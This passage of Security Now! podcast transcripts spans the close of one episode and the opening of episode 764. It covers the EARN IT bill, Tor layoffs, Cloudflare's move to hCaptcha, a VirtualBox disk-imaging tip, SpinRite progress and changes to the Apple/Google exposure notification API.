He finishes:  "There is still time to make your voice heard.  We encourage U.S. citizens to reach out to their elected officials and express their opposition to the EARN IT bill.  You can find contact information for your representatives using the Electronic Frontier Foundation's Action Center."  He finishes:  "Stay safe.  Stay inside.  Stay encrypted."



I have a full link to the EFF site, but I created one of my shortcuts for this purpose, grc.sc/earnit.  That just bounces you easily to that EFF page where you can use it to look up your representative and send them your feelings about the idea of this legislation going forward.  Ultimately it is up to us to keep this from happening.  It just really is an amazingly slimy end-around legislation.  We have to prevent this from happening.  With any luck, it won't happen this year, and maybe we'll have different administration next year.



LEO:  Yeah, I mean, I really do think it's Barr.  Although, boy, you know, you've got Diane Feinstein who's always hated encryption.  Dick Blumenthal.



STEVE:  Yes, yes, you're right.  It's not just Republicans.  It's Democrats are, like...



LEO:  Blumenthal, ironically...



STEVE:  Blumenthal's behind it, too.  He's the co-sponsor of the bill.



LEO:  I know.  He claims it doesn't prevent encryption, which either is naive or disingenuous.  I can't figure out which.  Recently he said something about how he had to have strong encryption.  And I thought, well, why are you sponsoring EARN IT, then?  



STEVE:  Yup.



LEO:  So I don't - he may just be confused.  But, yeah.  It's a real issue.



STEVE:  And I didn't mention it again, but they always talk about protecting the children.



LEO:  Yeah, it's always about the children.



STEVE:  Okay, come on, yeah.



LEO:  That's the straw man.  It's either terrorists or children because they know that nobody is in favor of child abuse or terrorism.  So they can paint any opponent as being, oh, you must like child abuse, or you must like terrorists, instead of really debating the merits of it.  And they don't want to do that because they know they lose.



STEVE:  And as we know, Josh's argument that the bad guys will simply use something else is exactly correct.



LEO:  Right, they know that.



STEVE:  I mean, that is absolutely what will happen.



LEO:  Dumb guy, you know, I remember back when we were doing The Screensavers, for some reason the Secret Service thought that Patrick and I knew something about technology or whatever.  They asked us to brief them.  And I remember talking to them.  And they said, look, you know, most criminals just hand over the password eventually.  They don't, you know, most of them aren't that sophisticated.  Or if they are, they confess.  They give up.  It's really rare that you get somebody who is just not going to, you know, is going to be able to - but those guys you're never going to get because the math is out there.  Remember they finally released the child pornographer, the guy who had a ton of child pornography on his hard drive.



STEVE:  On his hard drive.  And he wouldn't, yup...



LEO:  Wouldn't give up the password.  And the judge finally said you can't hold this guy.  Sorry.  So I don't know.  I don't know.  EARN IT is not, clearly has nothing to do with child abuse, has everything to do with encryption.  Period.



STEVE:  Yeah.  Just another mention, sort of a public service announcement or a Tor Project service announcement.  The Tor Project, of course, used to be The Onion Router.  We did a really cool podcast back in the day about how it works, all the technology of protecting your anonymity on the Internet.  Very difficult to do.  It's not possible to do it perfectly, but Tor does everything humanly possible.  I mean, it's been a real academic research project for years, just academicians trying to, you know, scratching their head, how can we make this better?  How can we actually protect someone's identity?  It is 100% donation supported.



And understandably, with so many past supporters worried now about the shape of their own future, the flow of donations has dwindled since the start of the year.  Consequently, their recent staff of 35 people has just been reduced to 22, after a 13-person layoff.  They were sorry to lose anyone, they said, since those were valuable contributors to the project.  But there was just no money available to pay them.  The project states that, with their reduced overhead, they should be okay.  But if any of our listeners have been a user of Tor and/or you want to help keep their lights on and their servers spun up, it might be worthwhile to drop them a little bit of monetary support, if you're in a position to do so.  So yet another casualty.  I mean, not the whole service in general, but they had to cut a third of their staff, essentially, in order to just pay the bills.



This didn't make it onto last week's podcast, although it was in my list of things to talk about.  So I didn't want to pass it up because I thought it was just sort of interesting.  I'm cutting the center out of a much longer blog post by Matthew Prince, who as we know is the CEO of Cloudflare.  It was just sort of surprising, and I thought our listeners would find it interesting.



So jumping into the middle of his longer whole blog post, and I have the link to the whole thing, he said - this is Matthew Prince speaking, CEO of Cloudflare:  "Since Cloudflare's earliest days, we have used Google's reCAPTCHA service.  ReCAPTCHA started as a research project out of Carnegie Mellon University in 2007.  Google acquired the project in 2009, around the same time that Cloudflare was first getting started.  Google provided reCAPTCHA for free in exchange for data from the service being used to train its visual identification systems.  When we were looking for a CAPTCHA for Cloudflare, we chose reCAPTCHA because it was effective, could scale, and was offered for free  which was important since so many of Cloudflare's customers use our free service.



"Since those early days, some customers have expressed concerns about using a Google service to serve CAPTCHAs.  Google's business is targeting users with advertising.  Cloudflare's is not.  We have strict privacy commitments.  We were able to get comfortable with the Privacy Policy around reCAPTCHA, but understood why some of our customers were concerned about feeding more data to Google.  Also, we had issues in some regions, such as China, where Google's services are intermittently blocked.  China alone accounts for 25 percent of all Internet users.  Given that some subset of those could not access Cloudflare's customers if they triggered a CAPTCHA was always concerning to us.



"Over the years, the privacy and blocking concerns were enough to cause us to think about switching from reCAPTCHA.  But like most technology companies, it was difficult to prioritize removing something that was largely working instead of brand new features and functionality for our customers.  Earlier this year, Google informed us that they were going to begin charging for reCAPTCHA.  That is entirely within their right.  Cloudflare, given our volume, no doubt imposed significant costs on the reCAPTCHA service, even for Google.  Again, this is entirely rational for Google. If the value of the image classification training did not exceed those costs, it makes perfect sense for Google to ask for payment for the service they provide. In our case, that would have added millions of dollars in annual costs just to continue to use reCAPTCHA for our free users.  That was finally enough of an impetus for us to look for a better alternative.



"We evaluated a number of CAPTCHA vendors as well as building a system ourselves.  In the end, hCaptcha emerged as the best alternative to reCAPTCHA.  We liked a number of things about hCaptcha solutions:  One, they don't sell personal data.  They collect only minimum necessary personal data, they are transparent in describing the info they collect and how they use and/or disclose it, and they agreed to only use such data to provide the hCaptcha service to Cloudflare.  Two, performance, both in speed and in solve rates, was as good or better than expected during our A/B comparison testing.  Three, it has a robust solution for visually impaired and other users with accessibility challenges.  Four, it supported Privacy Pass to reduce the frequency of CAPTCHAs use.  Five, it worked in regions where Google was blocked.  And, six, the hCaptcha team was nimble and responsive in a way that was refreshing.



"The standard hCaptcha business model was similar to how reCAPTCHA started.  They planned to charge customers that needed image classification data and pay publishers to install their CAPTCHA on their sites.  Sounded great to us; but unfortunately, while that may work well for most publishers, it doesn't at Cloudflare's scale.



"We worked with hCaptcha in two ways.  First, we are in the process of leveraging our Workers platform to bear much of the technical load of the CAPTCHAs and, in doing so, reduce their costs.  And, second, we proposed that, rather than them paying us, we pay them.  This ensured that they had resources to scale their service to meet our needs.  While that has imposed some additional costs, those costs were a fraction of what reCAPTCHA would have.  And, in exchange, we have a much more flexible CAPTCHA platform and a much more responsive team."



So anyway, there was a big preamble about what reCAPTCHA is and so forth, or what CAPTCHAs are, and more.  That was just the meat in the middle.  And I thought our listeners would find it interesting that Cloudflare, a company that we think is doing a great job on many fronts, and that many of our listeners are users of, and a number of people we know of directly, decided, you know, reCAPTCHA, not so much anymore.  We're going to look around.  And I wanted to let our listeners also know about hCaptcha, yeah.



LEO:  Yeah.  I haven't tried hCaptcha, but I'm really starting to hate reCAPTCHA.



STEVE:  Yeah, yeah.  A bit of miscellany.  I mentioned a change of my virtual machine platform.  I have been stunned by VirtualBox.  I'm coming from an owner of VMware.  It was sort of the early player, the original platform.  I own it.  I have a number of VM machines.  When my XP machine hardware went belly-up, remember, about, what, maybe a year ago, I mean, the box completely died, I was able to pull the image from the RAID and get it into a VMware VM, so I was able to sort of bring it back alive enough to get the things off of it that I needed.  Anyway, with the work on SpinRite, I don't know what it was that led me to VirtualBox.  It is a free offering from Oracle.  The more I use it, the more amazed I am.



I posted to the grc.spinrite.dev newsgroup a post, which I'll read.  The subject was "STUNNED [in all caps] by VirtualBox."  I said:  "The more I use this incredible free tool, the more amazed I am.  For my work on SpinRite, I had built and fine-tuned an optimal FreeDOS-based DOS system with Windows file sharing so that the DOS machine could see the SpinRite development directory on my workstation.  It also had a font replacement for improved 50-line text fonts, my favorite non-protected mode debugger and various other utilities, and a boot menu so that I could boot into different DOS configurations.  This perfect DOS machine was operating in a VirtualBox VM.  So now I wanted to create an image of the drive so that I could clone it into several physical systems for additional testing on real hardware.



"To do that I wanted to use my favorite bootable imaging tool, which is Terabyte's Drive Image.  So I plugged a Drive Image bootable USB thumb drive into the Win7 host machine.  I opened Windows Disk Manager and looked up the physical drive number that had been assigned to the USB drive.  In this case it was number five.  I then opened a command prompt and switched to the 'VirtualBox' directory" - that is, the install directory where VirtualBox is - "so that I could conveniently use the 'VBoxManage' command line utility."



And then I show the invocation, the command that I used, VBoxManage internalcommands createrawvmdk -filename, then my "%USERPROFILE%"\.VirtualBox\usb.vmdk -rawdisk \\.\PhysicalDrive5.  "That created a mountable usb.vmdk virtual virtual disk from the physical USB drive plugged into the Windows box.  It didn't copy it.  It just, on the fly, created a virtual virtual drive.  I added that VMDK to the virtual machine that I wanted to image and moved it to the primary master position so that it would have boot precedence.  I also added another virtual disk to receive the image that Drive Image would create.



"I then rebooted the VM, and the Drive Image main menu popped up, and it all worked perfectly.  I was able to create a drive image of the working DOS VM drive which was stored onto another virtual disk.  I then removed the temporary drives and dismounted everything.  I copied the newly created drive image onto the USB to create a self-contained bootable 'set up a DOS machine' thumb drive and, using that, I cloned my working, I call it 'SpinDEV image,' to multiple laptops."



And this is after using this thing for a couple months.  Anything I have imagined that I've wanted to do with VirtualBox has been possible.  The UI is just sort of the frosting.  It's the standard things you want to do.  It makes mounting and dismounting, creating and doing easy things simple.  The key, though, is this VBoxManage command line utility.  Oh, my god.  I mean, just anything you can imagine you want to do.  And it's compatible with all of the formats of everybody's virtual disk format.  And that may have been the thing that brought me to it.



Anyway, upon seeing that, that I posted, a long-time contributor in the forums, Greg Bell, replied:  "Fifteen years ago, then again 10 years ago, I tried all the various VM technologies and settled on VMware Workstation as being head and shoulders above the rest for pretty much everything.  And I've used it all this time.  Recently I had a need to revisit VirtualBox so I could collaborate with someone else.  And, man, have they come a long way."



He said:  "Like *everything* [he has in asterisk brackets] *everything* is possible if you know the right VBoxManage spell.  Things I have to wrestle VMware to the ground over, VBox is like 'Sure.  Want a hundred other options, too?'"  And he says, "Command lines for everyone."  And then he said to me, "Wait till you start getting into USB device attaching," which I haven't had occasion to yet.



But anyway, so I just wanted to take a moment to share my utter amazement over this completely free VirtualBox solution from Oracle.  If you haven't looked at it recently, I wasn't aware of it a long time ago.  I was just happy with VMware Workstation, which I, like Greg, it was the best thing I had seen.  But, boy, I'm a convert.  It just - it does a beautiful job.



Two pieces of closing-the-loop feedback from our listeners.  Geoff Clow tweeted @SGgrc:  "Steve."  And he said:  "FF with TST."  Took me a little bit to unscramble that.  He said:  "Do you disable the FF built-in horizontal tabs?  If so, how?"



Okay.  So FF is Firefox.  TST is Tree Style Tabs, which is the add-on I use to put tabs down the left-hand side.  So he's asking, if you add the Tree Style Tabs to Firefox, what about the tabs across the top?  And so to Geoff and everybody else who's interested, yes, I disable them.  He says:  "If so, how?"



Firefox is based on an HTML - the actual Firefox UI is driven by an HTML style sheet.  And so it is possible, down in your user profiles, there you can find a style sheet file which you are able to tweak in all kinds of interesting ways in order to change the way Firefox looks.  One of the things you're able to do is to remove the margin from the top where the tabs are and squeeze them out of existence.  I found it just by googling.  There is a way to go into some settings and have it help you get to the path where the file is located.  But if you just google "customize Firefox style sheet" or something like that, or "user customization" or that kind of thing, you'll find it.  So that's what I did.



The second is Lee Hadassin.  He tweeted @SGgrc:  "Hey Steve.  Listened to SN-762."  So that was last week.  He says:  "I think I see Moxie's POV [point of view relative to privacy]."  He said:  "Privacy is there," meaning for the secure tracing.  "Privacy is there until you test positive.  If this is a framework for third-party apps, and they get the diagnosis keys, what is stopping them from correlating the time/location to possibly identify who it was?"



Great question.  And I guess I would say that's out of scope for the API.  What we talked about, and all Apple and Google collaborated on, is creating the underlying foundation.  You are needing to trust the apps.  And I guess it's the case, depending upon the accessibility, the visibility they have into your keys, if a third-party app knew that it was posting its diagnosis keys, and if it had been tracking where you were all the time, well, the diagnosis key has a one-day granularity.



So anyway, you know, it would be difficult in order to reverse that.  I won't say it's impossible.  But, for example, it's why I'm glad both companies are moving this down into the OS and why they've both said they're going to produce their own app to reference this API.  I feel much more comfortable using apps' interface to this facility on my iDevices than any governmental or other third-party app.  I don't think we're going to have to wait long for it.  Apple recognizes the need, and they did say they were going to produce their own app.  So that's what I would use.



Again, I think I agree with you.  I don't know if that's what Moxie was talking about.  It is the case that we have a foundational technology that lets us be secure.  But, yeah, we're relying on the upstream integrity, privacy-respecting integrity that uses it not to work to subvert it.  Certainly I think it's possible that something could.



And lastly, a little SpinRite progress report.  I'm pleased to report that SpinRite's technology for talking to drives through AHCI controllers is starting to work.  I've successfully performed an "identify device" command on both a VirtualBox VM and on a physical Dell laptop.  I chose a very simple 512-byte "identify device" query specifically because it required the least possible from the drive and because it was probably the easiest thing for me to get working.  The logic here is that getting anything at all to work with an AHCI controller requires so much hardware to be exactly correctly set up that pretty much everything has to be working correctly for anything to work at all.



So when I saw that I had captured the drive's identity information into RAM, I knew that now it was just a matter of refinement.  Until now, until this time, SpinRite using the BIOS for its bulk data transfer has had the advantage of essentially hiding behind the BIOS.  It was able to use the BIOS to provide a compatibility interface to whatever the motherboard's hardware happened to be.  That's the big thing that's changing now, that SpinRite will be bypassing the BIOS for all mass storage access.  So my plan is to refine this first utility, which I've been calling SpinTest, since it's intended to only be a development and proving ground for SpinRite's next-generation technologies.  SpinTest will wind up being a complete robust mass storage device enumeration utility, talking directly to hardware.  And as it develops, I will run it first on every piece of hardware that I own, and I own plenty since I never throw anything away.  Then, once it's correctly working on everything I have, and I've tested as much as I'm able, I'll turn it loose into the guys over in the grc.spinrite.dev newsgroup for everyone there to test and to use on all their many pieces of both old and new hardware.



And I have no idea what will happen because I've seen reports of some very odd, finicky, and nonstandard hardware out in the field.  Those may have been things that SpinRite had been isolated from, thanks to the BIOS.  But wherever SpinTest initially fails, and I'm sure it will somewhere, I will get it working on everything that our testers are able to have it encounter.  And this of course is a useful investment for me since this new technology will all be the basis for both the Beyond Recall product, which will follow SpinRite 6.x, and for SpinRite 7.



Back in 2013, before I put this SpinRite work on hold, I already had written drivers for the AHCI controller when it was in its legacy or compatibility mode, and also for older IDE motherboard controllers.  That's how I was able back then to perform those benchmarks, which showed SpinRite reading 65,536 sectors at a time into a single 32MB buffer, and thus running at half a terabyte per hour.  So I currently have all that code turned off to focus only upon AHCI.  But once I've got native AHCI working completely with SATA drives, I'll turn that other code back on, and we'll have all system drives, both old and new, accessible to SpinTest without any BIOS involvement.  So anyway, that's where I am, making great headway with this work on SpinRite, which I know a large number of our listeners are waiting for anxiously.



And I have news of next week.  Unless something happens to derail my plan, I want to take our listeners on a deep dive into a very cool new service recently spun up by Cloudflare.  It allows us to all test our own ISPs' BGP routing security in an effort to promote the adoption of an effective security framework known as RPKI, Resource Public Key Infrastructure.  So stay tuned.



LEO:  How exciting.  I look forward to it.



STEVE:  Good stuff.



LEO:  I've been - remember we talked some time ago, we were talking about, when we were talking about DOH, DNS-over-HTTPS, and we talked about Cloudflare.  And then recently Firefox added NextDNS, and they had a quote on the front page from me which I didn't remember.  Then I finally found the show in which I...



STEVE:  Right. 



LEO:  So I've revisited, and they have an interesting service.  Cloudflare, you know, has added 1.1.1.2 and 1.1.1.3 for malware and ad blocking.



STEVE:  Yes.



LEO:  And NextDNS does something very similar and very cool.  So I'm just going to float that by your radar.  I've started using it at home and on my mobile devices.  And right now it's a free service, and it's really impressive.  So just it's similar to - it's basically a pie hole that they're running for you, in effect.  Malware protection, which I think is so important nowadays.  If you want, ad blocking.  But it does some fun things like it prevents typo squatting, so you don't accidentally go to T-V-V-I-T-T-E-R and enter your credentials and things like that.  There's some very clever stuff.  And I really love the logs because it gives you logging of all the devices using it.  So really interesting.  Just kind of run it over your radar at some point.  I'm interested in this PGP protection because Cloudflare just announced that.  That'll be very interesting.



STEVE:  Yeah, yeah, yeah.



LEO:  As always, this is a must-listen-to show, every Tuesday.  We're a little late today.  We try to get it in at 1:30 Pacific for our live taping, if you want to watch us do it live, anyway.  That's 4:30 Eastern time, 20:30 UTC.  The live streams, audio and video, are available at TWiT.tv/live.  Also on YouTube Live, if you want to go there directly, although we link to that at TWiT.tv/live.  If you're listening live, the chat room is live.  Well, it's live 24/7.  In fact, if you get lonely at all, any time of the day or night...



STEVE:  And it's got live people.



LEO:  And there's actual people.  And it's a really nice bunch.  And so I know a lot of you are quarantining alone and maybe getting a little lonesome sometimes.  This is a great place.  I go in there sometimes in the middle of the night when I can't sleep, and there's always somebody fun in there.  So irc.twit.tv.  I want to give them a little plug.  We also have a wonderful asynchronous community, kind of like your forums, Steve, in fact inspired by yours, running on the Discourse platform.  That's www.twit.community, and there's even a Mastodon instance, twit.social.  So we have lots of ways to interact.  If you're a Steve Gibson type of fan, obviously, he's on Twitter at @SGgrc, and he takes DMs from anybody.  So that's the best way to reach Steve, @SGgrc on the Twitter.



If you want copies of the show, he has some unique versions of it, a 16Kb audio version.  It sounds a little like Thomas Edison singing "Mary Had a Little Lamb," but it's a very small file.  So if you're bandwidth...



STEVE:  [Simulating poor audio].  This is Security Now!.



LEO:  Mary had a little lamb.  That's at GRC.com.  So are 64Kb versions, if you want a little bit better audio.  He even has transcriptions.  It's the only place you can get transcriptions of the show that he commissions from Elaine Farris, and they are really good.  So she gets every "um" and "uh" and everything.  It's all in there.  It's just like listening except you're reading.  I think a lot of people read along while they listen, which sometimes aids with comprehension.  There's a lot of material in these shows.



Steve's SpinRite is there, and the 6.0 is there, so you can get it right now, the world's best hard drive maintenance and recovery utility.  When 6.1 comes out, you'll get early access to it if you buy it now.  So if you don't have SpinRite, get it:  GRC.com.  That's the only paid thing on that whole site.  That's his bread and butter.  But he's got all sorts of other wonderful stuff there.  Spend some time with Steve at the Gibson Research Corporation.



We have audio and video of the show at our website, TWiT.tv/sn.  TWiT.tv/sn.  You can also get it on YouTube.  But the best way probably would be to subscribe.  Find your favorite podcast application, search for Security Now!, and press the Subscribe button.  That way you'll get it the minute it's available.  And I know you don't want to miss an episode.  This is one show where it's good to the last drop.  You want to drink every drop of this fine, highly caffeinated beverage.  So subscribe.



Steve, stay well, stay healthy, stay quarantined, and we'll see you next week on Security Now!.



STEVE:  Thanks, Leo.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#764

DATE:		April 28, 2020

TITLE:		RPKI

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-764.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we update on the Apple/Google contact tracing technology.  We take a close look at the past week's frenzy over two newly disclosed vulnerabilities in iOS's mail application.  We consider the choice of VPN provider relative to expanding global surveillance agreements.  We look at some recently spotted dangers of public repositories.  We share a bit of miscellany, a SpinRite update, and some useful feedback from a listener regarding Oracle's VirtualBox VM system.  We wrap up the week with a look into RPKI (Resource Public Key Infrastructure) for finally bringing some security to BGP, the Internet's critical Border Gateway Protocol.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  He's going to talk a little more about the Google/Apple proposal for contact tracing and why it's better than that a lot of countries are proposing.  We'll also talk about that email exploit, the zero-click, zero-day on Apple iOS devices.  Is it really that deadly?  Well, maybe not so fast.  Steve will explain.  And a look at RPKI in a better way to protect us from BGP router mistakes.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 764, recorded Tuesday, April 28th, 2020:  RPKI.



It's time for Security Now!, the show where we cover your safety, security, privacy, technology in general with this guy right here, Steve Gibson of the Gibson Research Corporation.  Hello, Steve.



STEVE GIBSON:  And other things that we find interesting, even if they're sometimes a little non sequitur or off-topic.



LEO:  Honestly, I think that's the appeal of the show.  It's really - it's about Steve.



STEVE:  Well, actually we do this far less than any other podcast that you produce, Leo.  But pretty much we're on target.



LEO:  You stick to, yeah, most of my stuff is pretty meandering, yeah.



STEVE:  We do have a miscellany section where random stuff wanders in.  And sometimes it takes over the whole podcast.  But not very often.  In fact, not today.  This is, as I promised last week, RPKI, which is the move toward doing something really important for the Internet, which is working to begin securing BGP, the Border Gateway Protocol.  We've spoken many times, and I have some fun examples of mistakes that were maybe inadvertent because it's even more scary if they were deliberate.  But it's interesting how fragile the routing management of the Internet turns out to be.



So this is Security Now! 764 for the last podcast of April.  We're going to start by updating on the Apple/Google contact tracing technology.  They've tweaked it since two weeks ago, when it was the topic of the podcast.  But I thought makes sense then to update about the tweaks and how I feel about them two weeks later.  And this week we're supposed to get the beta.  We're also going to take a close look at the past week's frenzy over two newly disclosed vulnerabilities in iOS's mail application, as you on the previous podcast suspected we would do.  And I do think it was probably overblown.  We'll consider the choice of a VPN provider relative to expanding global surveillance agreements.  And the good news is, one of this network's VPN sponsors, if ExpressVPN is still a sponsor...



LEO:  Is still a sponsor.  Yes, it is.



STEVE:  Still a sponsor on the page.  



LEO:  Yes, it is.



STEVE:  I did my homework.  And they're in the clear...



LEO:  Oh, good.



STEVE:  ...relative to the, what is it now, it's 15 Eyes or something.  The Eyes keep multiplying.



LEO:  A lot of Eyes.



STEVE:  Also we're going to look at some recently spotted dangers of public code repositories, taking a specific example.  We've got a bit of miscellany, a quick SpinRite update, and a useful bit of feedback from a listener regarding my rave last week of Oracle's VirtualBox VM system, just sort of a caution.  And we're going to wrap up by taking a look at what RPKI is.  And Leo, we do have a Picture of the Week that is one for the ages.  So I think another great podcast for our friends.  Ah, yes.  So this is a woman who doesn't quite understand the concept of a face mask.  She's taken a Norton Antivirus CD and rubber-banded it to her face, hoping that it will...



LEO:  But it's so easy to breathe through the little hole in the middle.



STEVE:  It is much more convenient, and you don't get all steamed up and fogged up and everything that we're putting up with, with our face masks.  So anyway, I don't think it will be as effective as she hopes.  For one thing, that hole is way too large, you know, it's got to be down in the microns in order to block the virus.  So anyway, someone tweeted that to me, and I thought, well, that's perfect for a little bit of levity.



So the joint Apple/Google virus contact tracing that was our main focus two weeks ago has been gaining traction, I'm glad to say.  There are some organizations, some state actors, some countries that have indicated that they're going to adopt it, as opposed to their own ad hoc - I just think, thank goodness, because that's one of the big benefits of there being an established platform, which was...



LEO:  I agree.  I was talking about this earlier.  Australia's trying something that's terrible.  France is pissed at Apple because they said you won't give us the data.  It's clear that Apple and Google have got it together compared to these nationalities.



STEVE:  Yeah.  And we've seen what happens when government tries to do technology.  Famously, in this country, despite all of the technology and lots of money, what was the health system that tried to switch on and was a complete disaster, Obama's...



LEO:  Obamacare, yeah, yeah, yeah, the ACA.



STEVE:  Obamacare, oh, my lord.



LEO:  But, you know, it was a good ending to that story.  A lot of times people talk about that and, oh, the billion dollar health.  But what happened was a bunch of coders from Silicon Valley got together, and the United States Digital Service was born, and they made a much better site.  And as a result you've got some really competent people - Matt Cutts is their administrator - doing stuff like for the Veterans Administration and other websites.  And these government websites, they really do need to be updated.  As you know, that's the one reason TLS 1.2 won't die. 



STEVE:  Well, exactly.  And this sort of speaks to the point, which is there are some things you don't want to have amateurs do.  It's just like, okay, step away from the computer.  We don't want you to try to home roll your own contact tracing system that feeds up to Big Brother.  So the idea that, quickly, as I said, this week we're supposed to have this in beta from Apple and Google.



LEO:  Today, I think, supposedly.



STEVE:  Oh, good.  That's heading, you know, heading these independent efforts off at the pass, which is where they need to go to die.  It's like, okay, just stay away.  So I'm already on record saying that, based on my reading of the technology, which I shared with our listeners two weeks ago, I believe that the system is clearly and cleverly designed to achieve its stated goal of allowing someone who's chosen to use this system to obtain a notification if they were probably in proximity, both in space and time, to another user of the system during a time when that other user may have been contagious with this novel coronavirus.  And most importantly, this system enables this minimal service while providing maximal protection of the privacy of all participants.  Which is why I looked at it, and it passed muster.



Okay.  So as we know, they're on schedule to be providing an initial beta.  As you said, today.  Last Friday they disclosed a number of changes they were making, they said to further enhance the system's existing privacy protections and accuracy.  It's like, oh, okay.  Well, so we'll look at those.  What are there?  There's eight of them.  So first, the term "contact tracing" has been changed to "exposure notification," which Apple and Google feel better describes the functionality of the API.  That's what they're actually offering is exposure notification, which I think is accurate.  They said the system may also not stand alone.  While it is intended to notify a person of potential exposure, it may be used to augment broader contact tracing efforts that public health authorities are planning.



So again, that sort of reminds us that this is an API.  That's actually something, and I'll expand on this a little bit in a minute, that makes me uncomfortable because what you build on top of it could still be doing evil, even if it's on top of this API.  And so the fact that they're not offering turnkey apps that I would also tend to trust is a bit of a problem.



Anyway, the second point, they said, keys will now be randomly generated, rather than derived from a temporary tracing key, making it more difficult for someone to guess how the keys are derived, and use that information to try and track people.  Okay, that is utter nonsense.  But okay.  Maybe someone somewhere else raised their hand and said, "I don't know what HMAC means.  Could you just make them random?  Because I don't know what HMAC means."  And so someone at Google and Apple probably just looked at each other and said, yeah, okay, fine.  I mean, it doesn't really matter.  It means that rather than storing one's secret from which you are able to re-derive the keys from the past, again, there's nothing wrong with that.  That was perfect.  But "I don't know what HMAC means."  Okay, fine.



So third point.  Bluetooth metadata will be encrypted, making it more difficult for someone to try and use that information to identify a person.  I think that sounds like a great enhancement.  Bravo.  So, good.  Encrypt your Bluetooth metadata.



Fourth point, exposure time will be recorded in five-minute intervals, with a maximum exposure reported capped at 30 minutes.  Okay.  Not a biggie.  Slightly more granular.  So a bit of a privacy enhancement, you know, you're not sure was it seven, was it eight, no, we're either going to tell you it was five or 10, and we're not going to tell you if they were there longer than 30.  So okay.  If there wasn't a cap, you could imagine how you could make an inference if it was like a long exposure.  Then it's like, oh, I know who that had to be.  So, fine.



Fifth point.  The API will include information about the power level of the Bluetooth signal in the data that is exchanged between phones.  This can be used in conjunction with RSSI, that's the Received Signal Strength Indication, to more accurately estimate the distance between two phones when contact was made.  And I think that's very clever.  That's, you know, so the point is the beacon that is sent will also include its transmitted power level so that the receiver can incorporate that along with the received power that its own receiver gets in order to make a better judgment.  That's brilliant.  Whoever added that, bravo.



Sixth point.  Apple and Google will allow developers to specify signal strength and duration thresholds for exposure events.  In other words, maybe that was originally just going to - they were going to do that and decide how long and how strong and what the bar was that you had to clear in order to decide that the phones were close enough to relate to viral exposure.  Now that'll be a parameter in the API.  Okay, fine.



Seventh point, the API will now allow for determining the number of days since the last exposure event to better determine what actions the user should take next.  Okay, that's a nice enhancement.  I guess that means that that information will be available in the API.  Previously everybody would be checking daily to check to see whether they received any keys that indicated that the people had been near them.  Now there'll be an explicit, when was this exposure event?  That'll be added to the data flow.  So, cool.



And lastly, the API's encryption algorithm is switched from HMAC to AES.  They said:  "Many devices have built-in hardware for accelerating AES encryption, so this change should help performance and efficiency on phones."  That's also total nonsense.  I mean, the difference in power, in electrical power, for the minuscule amount of data involved in doing AES with hardware acceleration versus HMAC, pales in comparison to having your screen turned on.  I mean, that's complete nonsense.  But okay, fine.  Again, we want this to be adopted.  So by all means, again, "I don't know what HMAC means."  Fine.  AES, everybody knows that's, ooh, encryption.  Encryption good.  So it's in there.



So we're in a weird position here.  Everyone is talking about the critical need for contact tracing.  New York's Governor Andrew Cuomo is planning to hire and train up a major human force to pursue old-school pencil-and-paper contact tracing.  Maybe it'll be augmented with this.  Maybe this is where you start.  Then you follow up with people.  I mean, like if you are told you are near somebody through the technology, then you call a hotline, and then someone comes out and interviews you.  Who knows how this is going to go?  It's going to be interesting to see how this whole thing fares.



But we do have technology now to augment traditional pre-technology contact tracing.  Most people have smartphones that are rarely out of their reach.  And Bluetooth is well suited to allowing those phones to sense one another's proximity in time and distance.  So at the minimum there's an intriguing possibility for automating at least some of this contact tracing challenge.  And as I said before we began recording, Leo, I kind of think the whole issue doesn't make much sense to me.  What we're learning is that this virus is already everywhere.  And the only way, as I've said before, the only way that the numbers we're seeing make sense is that it is pernicious.  I mean, New York is still under a complete lockdown, yet they're guessing that they've managed to push the R-naught in full lockdown to 0.8 in one region of New York and 0.9 in another.  So in lockdown, just barely below one, which is where it needs to be.



So I guess to me this feels a little bit like the magnetometers that we all now have to walk through at the airport because of 9/11.  But, you know, fine.  That's another discussion.  People appear to think this will be useful, and I salute Apple and Google for so quickly offering a technological foundation, and offering a truly good solution.  Which is what I'm sure it is.  But as the saying goes, "It's complicated."  And as many of those who are, well, and many of those who are opining on this complex technical issue and presumably being read by those looking for some guidance, unfortunately, they're getting important facts very wrong.



For example, I have seen since this announcement, Wired wrote:  "Even if the keys that the app uploads to a server cannot identify someone, they could, for instance, be linked with the IP addresses of the phones that upload them.  That would let whoever runs that server - most likely a government healthcare agency - identify the phones of people who report as positive, and thus their locations and identities."  Except no.  We know that's nonsense because cellular phone IPs are extremely ephemeral.



And in fact that's exactly the word Microsoft Research used in a paper exploring the feasibility of geolocating cellular phones by IP.  They wrote:  "In this study we show that the reasons for geolocation inaccuracy are twofold.  First, cell phone IPs are ephemeral, changing rapidly across HTTP requests.  As a result, each queried service observes a different IP address for the same device, even though the queries are executed in quick succession within a span of five to 10 minutes."  So again, here's Wired scaring people incorrectly.



And the Brookings Institution, in their piece titled - and they really didn't like this at all - titled "Contact-tracing apps are not a solution to the COVID-19 crisis."  They wrote:  "Some of the contact-tracing frameworks have been designed with security and privacy in mind, to some degree."  Well, how refreshing.  They said:  "The Apple/Google proposal, for example, stores the information about what contacts the device has made on each users' device, rather than reporting that information to a central server, as is the case with some of the other approaches."  Okay, well, that's not true.



Then they go on.  "This decentralized architecture isn't completely free of privacy and security concerns, however, and actually opens apps based on these APIs to new and different classes of privacy and security vulnerabilities.  For example, because contact-tracing apps constantly broadcast health status in connection with a unique, if rotating, identifier, it is possible to correlate infected people with their pictures using a stationary camera connected to a Bluetooth device in a public place."  And that of course is absolute utter nonsense.



As we know, the smartphones are not broadcasting a beacon declaring that its owner has been infected with the coronavirus, so stay clear.  But unfortunately, because the way the system does work is complicated, and few people outside this podcast apparently have any idea how it actually does work, the public's natural and healthy skepticism is being primed to say "No, thanks."  And I know, Leo, you agree that having that happen would be unfortunate.  So we understand that what Apple and Google have created is a solid platform which strongly encourages and enables the creation of secure and private contact tracing apps.



